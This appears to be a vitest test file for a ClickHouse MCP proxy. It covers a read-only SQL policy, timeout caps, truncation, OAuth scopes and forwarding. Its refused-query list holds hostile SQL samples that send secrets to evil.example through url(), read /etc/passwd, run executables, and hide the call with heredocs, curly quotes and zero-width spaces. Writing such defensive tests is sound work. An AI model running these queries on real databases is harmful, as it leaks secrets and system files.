import { mkdtempSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StreamableHTTPServerTransport } from "@modelcontextprotocol/sdk/server/streamableHttp.js";
import { CallToolRequestSchema, ListToolsRequestSchema } from "@modelcontextprotocol/sdk/types.js";
import pino from "pino";
import { describe, expect, it } from "vitest";
import { hooks } from "../src/hooks.js";
import { checkCall, checkQuery, isRead, MAX_TIMEOUT_SECONDS, NEVER, normalize, QueryRefused, SCOPES, truncateResult } from "../src/policy.js";
import { oauth, staticAuth } from "../src/vendor/oauth.js";
import { createVendorProxy } from "../src/vendor/proxy.js";

const tool = (name: string, readOnlyHint: boolean) => ({ name, inputSchema: { type: "object" as const }, annotations: { readOnlyHint } });
const tmp = () => mkdtempSync(join(tmpdir(), "clickhouse-mcp-"));

describe("clickhouse-mcp policy", () => {
  it("never reaches writes, costs, backups or ClickPipes, and reads the schema and SELECTs ClickHouse doesn't mark", () => {
    for (const n of ["get_organization_cost", "list_service_backups", "get_clickpipe", "create_service", "delete_service", "scale_service", "reset_password", "insert_rows"]) expect(NEVER.test(n), n).toBe(true);
    for (const n of ["get_organizations", "get_services_list", "get_service_details", "list_databases", "list_tables", "run_select_query"]) expect(NEVER.test(n), n).toBe(false);
    // Probed 2026-11-18: ClickHouse marks these three readOnlyHint false.
    for (const n of ["list_databases", "list_tables", "run_select_query"]) expect(isRead(tool(n, false)), n).toBe(true);
    expect(isRead(tool("run_query", false))).toBe(false);
    expect(isRead(tool("get_services_list", true))).toBe(true);
  });
});

describe("query check", () => {
  const ok = [
    "SELECT count() FROM events WHERE day = today()",
    "select * from db.t limit 10;",
    "WITH x AS (SELECT 1) SELECT * FROM x",
    "(SELECT 1) UNION ALL (SELECT 2)",
    "SHOW TABLES FROM bridge",
    "DESCRIBE TABLE bridge.deposits",
    "EXPLAIN SELECT 1",
    "SELECT * FROM numbers(10)",
    "SELECT * FROM clusterAllReplicas(default, system.query_log) LIMIT 5",
    "SELECT name, value FROM system.settings WHERE name = 'readonly'",
    "SELECT 'url(http://x)' AS s, 'a;b' AS t", // text in literals is data
    "SELECT url FROM pages WHERE url LIKE '%acme%'", // a column called url
    "SELECT domain(url) FROM pages -- top domains\nLIMIT 5",
    "SELECT $$it's url(x)$$ AS s, $tag$a$$b$tag$ AS t, \u2018url(y)\u2019 AS u", // heredocs and curly quotes are data too
    "SELECT a$b, 1e-5, 0x1p-3 FROM t # note\n LIMIT 1",
  ];
  const refused: [string, RegExp][] = [
    ["INSERT INTO t VALUES (1)", /only SELECT/],
    ["DROP TABLE t", /only SELECT/],
    ["ALTER TABLE t DELETE WHERE 1", /only SELECT/],
    ["SELECT 1; DROP TABLE t", /one statement/],
    ["SELECT 1 /* ; */; INSERT INTO t SELECT 1", /one statement/],
    ["SELECT * FROM url('https://evil.example/?d=' || (SELECT secret FROM s), 'CSV')", /url\(\)/],
    ["SELECT * FROM URL('https://evil.example', 'CSV')", /URL\(\)/],
    ["SELECT * FROM `url`('https://evil.example', 'CSV')", /url\(\)/],
    ["SELECT * FROM url/* hide */ ('https://evil.example', 'CSV')", /url\(\)/],
    ["SELECT * FROM s3('https://bucket/x', 'CSV')", /s3\(\)/],
    ["SELECT * FROM s3Cluster('c', 'https://bucket/x')", /s3Cluster\(\)/],
    ["SELECT * FROM remoteSecure('evil:9440', db.t)", /remoteSecure\(\)/],
    ["SELECT * FROM mysql('h:3306', 'db', 't', 'u', 'p')", /mysql\(\)/],
    ["SELECT * FROM file('/etc/passwd', 'LineAsString')", /file\(\)/],
    ["SELECT * FROM executable('x.sh', 'TSV', 'a String')", /executable\(\)/],
    ["WITH (SELECT 1) AS x SELECT * FROM gcs('https://storage.googleapis.com/b/o')", /gcs\(\)/],
    ["SELECT * FROM t SETTINGS max_execution_time = 99999", /SETTINGS/],
    ["SELECT * FROM t INTO OUTFILE 'x.csv'", /OUTFILE/],
    // Quoting ClickHouse reads that hid a call from this check: heredocs (the reported payload first), // comments, curly
    // quotes and Unicode spaces.
    ["SELECT $$'$$, * FROM url('https://evil.example/?d=' || (SELECT secret FROM s), 'CSV'), $$'$$", /url\(\)/],
    ["SELECT $x$'$x$ FROM url('https://evil.example/', 'CSV') WHERE $x$'$x$ = ''", /url\(\)/],
    ["SELECT 1 // '\n, * FROM url('https://evil.example/', 'CSV') // '", /url\(\)/],
    ["SELECT \u2018'\u2019, * FROM url('https://evil.example/', 'CSV'), \u2018'\u2019", /url\(\)/],
    ["SELECT * FROM \u201curl\u201d('https://evil.example/', 'CSV')", /url\(\)/],
    ["SELECT * FROM url\u200b('https://evil.example/', 'CSV')", /url\(\)/],
    ["SELECT 1 AS a$$ FROM url('https://evil.example/', 'CSV') -- $$", /url\(\)/],
    ["SELECT * FROM `\\x75rl`('https://evil.example/', 'CSV')", /backslash escape/],
    ['SELECT * FROM "\\x75rl"(\'https://evil.example/\', \'CSV\')', /backslash escape/],
    // What the lexer's own rules would decide is refused instead of guessed.
    ["SELECT 1$$ FROM url('https://evil.example/', 'CSV') $$", /\$ is allowed only/],
    ["SELECT $1", /\$ is allowed only/],
    ["SELECT $$unterminated", /\$ is allowed only/],
    ["SELECT 1e--5\n, 2", /space between a number/],
    ["SELECT 1 #x", /# starts a comment/],
    ["SELECT \u2018unterminated", /unterminated/],
    ["SELECT 'unterminated", /unterminated/],
    ["  ", /empty/],
  ];

  it("allows reads that stay inside the database", () => {
    for (const q of ok) expect(() => checkQuery(q), q).not.toThrow();
  });

  it("refuses writes, several statements, external table functions and settings overrides", () => {
    for (const [q, why] of refused) expect(() => checkQuery(q), q).toThrow(why);
  });

  it("reads past comments, quotes and escapes the way ClickHouse does", () => {
    expect(normalize("SELECT 'it''s', 'a\\'b' -- note\n FROM `my table` /* a /* nested */ comment */ # end")).toBe("SELECT '', '' FROM my table");
    expect(normalize("SELECT `it``s` FROM t")).toBe("SELECT it`s FROM t");
    expect(normalize("SELECT $$it's$$, $t$x$t$, \u2018a\u2019, \u201cmy col\u201d FROM t // c")).toBe("SELECT '', '', '', my col FROM t");
  });

  it("caps the timeout and leaves the other tools' arguments alone", () => {
    expect(checkCall("run_select_query", { query: "SELECT 1", serviceId: "s" })).toEqual({ query: "SELECT 1", serviceId: "s", timeoutSeconds: MAX_TIMEOUT_SECONDS });
    expect(checkCall("run_select_query", { query: "SELECT 1", serviceId: "s", timeoutSeconds: 3600 }).timeoutSeconds).toBe(MAX_TIMEOUT_SECONDS);
    expect(checkCall("run_select_query", { query: "SELECT 1", serviceId: "s", timeoutSeconds: 30 }).timeoutSeconds).toBe(30);
    expect(() => checkCall("run_select_query", { serviceId: "s" })).toThrow(QueryRefused);
    expect(checkCall("list_tables", { serviceId: "s", database: "d" })).toEqual({ serviceId: "s", database: "d" });
  });

  it("cuts long answers with a note, and drops their structured copy", () => {
    const long = { content: [{ type: "text", text: "x".repeat(50) }], structuredContent: { rows: [] } };
    const out = truncateResult(long, 20) as { content: { text: string }[]; structuredContent?: unknown };
    expect(out.content[0]!.text).toBe("x".repeat(20));
    expect(out.content.at(-1)!.text).toMatch(/cut this answer at 20/);
    expect(out.structuredContent).toBeUndefined();
    const short = { content: [{ type: "text", text: "ok" }], structuredContent: { a: 1 } };
    expect(truncateResult(short, 20)).toBe(short);
  });
});

describe("sign-in", () => {
  // Shaped like mcp.clickhouse.cloud on 2026-11-07: it offers more scopes than AidenHQ asks for.
  const MCP = "https://mcp.clickhouse.cloud/mcp";
  const fetchImpl = (async (url: string) => {
    if (url === MCP) return new Response("", { status: 401, headers: { "www-authenticate": 'Bearer realm="OAuth", resource_metadata="https://mcp.clickhouse.cloud/.well-known/oauth-protected-resource/mcp"' } });
    if (url === "https://mcp.clickhouse.cloud/.well-known/oauth-protected-resource/mcp")
      return Response.json({ resource: MCP, authorization_servers: ["https://mcp.clickhouse.cloud"], scopes_supported: ["mcp:access", "openid", "profile", "email"] });
    if (url === "https://mcp.clickhouse.cloud/.well-known/oauth-authorization-server")
      return Response.json({ issuer: "https://mcp.clickhouse.cloud", authorization_endpoint: "https://mcp.clickhouse.cloud/authorize", token_endpoint: "https://mcp.clickhouse.cloud/token", registration_endpoint: "https://mcp.clickhouse.cloud/register", scopes_supported: ["mcp:access", "clickstack:access", "openid", "profile", "email"] });
    if (url === "https://mcp.clickhouse.cloud/register") return Response.json({ client_id: "pw-client", token_endpoint_auth_method: "none" });
    return new Response("not found", { status: 404 });
  }) as unknown as typeof fetch;

  it("offers and asks for mcp:access only", async () => {
    const auth = oauth({ name: "ClickHouse", mcpUrl: MCP, stateDir: tmp(), scopes: { supported: SCOPES }, fetchImpl });
    expect(await auth.signIn!.scopes()).toEqual({ supported: ["mcp:access"], recommended: ["mcp:access"] });
    const u = new URL((await auth.signIn!.start("http://127.0.0.1:3120/clickhouse/callback")).url);
    expect(u.searchParams.get("scope")).toBe("mcp:access");
  });
});

describe("the proxy's real call path", () => {
  it("refuses a write query before anything is forwarded, and forwards a SELECT", async () => {
    const sent: unknown[] = [];
    const upstream = createServer(async (req, res) => {
      const server = new Server({ name: "clickhouse", version: "1" }, { capabilities: { tools: {} } });
      server.setRequestHandler(ListToolsRequestSchema, async () => ({ tools: [{ name: "run_select_query", inputSchema: { type: "object" as const, properties: { query: { type: "string" } } } }] }));
      server.setRequestHandler(CallToolRequestSchema, async (r) => { sent.push(r.params.arguments); return { content: [{ type: "text", text: "rows" }] }; });
      const t = new StreamableHTTPServerTransport({ sessionIdGenerator: undefined, enableJsonResponse: true });
      res.on("close", () => void t.close());
      await server.connect(t);
      await t.handleRequest(req, res);
    });
    await new Promise<void>((r) => upstream.listen(0, "127.0.0.1", () => r()));
    const proxy = createVendorProxy({ name: "ClickHouse", upstream: new URL(`http://127.0.0.1:${(upstream.address() as AddressInfo).port}/mcp`), auth: staticAuth(), log: pino({ level: "silent" }), serviceKey: "svc", caller: async () => {}, instructions: "test", stateDir: tmp(), hooks });
    try {
      await expect(proxy.call("run_select_query", { query: "DROP TABLE events" })).rejects.toThrow(/Query refused/);
      await expect(proxy.call("run_select_query", { query: "SELECT 1; SELECT 2" })).rejects.toThrow(/Query refused/);
      expect(sent).toEqual([]);
      await proxy.call("run_select_query", { query: "SELECT 1" });
      expect(sent).toHaveLength(1);
    } finally {
      proxy.close();
      upstream.close();
    }
  });
});
